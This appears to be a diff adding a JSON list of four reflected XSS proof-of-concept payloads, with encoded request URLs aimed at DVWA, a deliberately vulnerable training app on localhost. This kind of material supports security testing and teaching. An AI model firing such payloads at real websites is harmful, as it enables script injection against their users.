@@ -1,0 +1,22 @@
+[
+    {
+        "vulnerability": "XSS",
+        "payload": "<script>alert('XSS')</script>",
+        "url": "http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&Submit=Submit"
+    },
+    {
+        "vulnerability": "XSS",
+        "payload": "<img src=x onerror=alert(1)>",
+        "url": "http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E&Submit=Submit"
+    },
+    {
+        "vulnerability": "XSS",
+        "payload": "<svg/onload=alert(1)>",
+        "url": "http://localhost/dvwa/vulnerabilities/xss_r/?name=%3Csvg%2Fonload%3Dalert%281%29%3E&Submit=Submit"
+    },
+    {
+        "vulnerability": "XSS",
+        "payload": "'><script>alert(1)</script>",
+        "url": "http://localhost/dvwa/vulnerabilities/xss_r/?name=%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&Submit=Submit"
+    }
+]
